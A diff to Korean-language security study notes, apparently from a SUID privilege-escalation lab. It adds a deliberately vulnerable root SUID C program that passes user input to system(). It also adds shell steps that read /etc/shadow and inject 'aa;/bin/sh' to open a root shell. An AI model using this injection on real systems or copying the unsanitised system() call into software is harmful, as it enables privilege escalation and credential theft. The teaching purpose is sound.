@@ -141,6 +141,8 @@ cat /etc/zzz
 		- root 소유 SUID 프로그램이므로 프로그램은 모든 파일을 볼 수는 있지만 쓸 수는 없다
 		- 이 프로그램을 사용해 다른 명령어를 root 권한으로 실행해보자
 ```c
+catall.c
+
 int main (int argc, char *argv[]) {
 	char *cat = "/bin/cat";
 	
@@ -149,6 +151,22 @@ int main (int argc, char *argv[]) {
 		return 1;
 	}
 
-	char *command = malloc(strle)
+	char *command = malloc(strlen(cat) + strlen(argv[1]) + 2);
+	sprintf(command, "%s %s", cat, argv[1]); 
+	-> command 버퍼에 저장된 cat의 문자열 "/bin/cat" 출력, argv[1] 문자열 출력
+	system(command); 
+	-> /bin/cat
+	return 0;
 }
+```
+
+```shell
+$ gcc -o catall catcall.c
+$ sudo chown root catall
+$ sudo chmod 4755 catall
+$ ls -l catall
+> -rwsr-xr-x root seed
+$ catall /etc/shadow
+> 정상 출력
+$ catall "aa;/bin/sh"
 ```
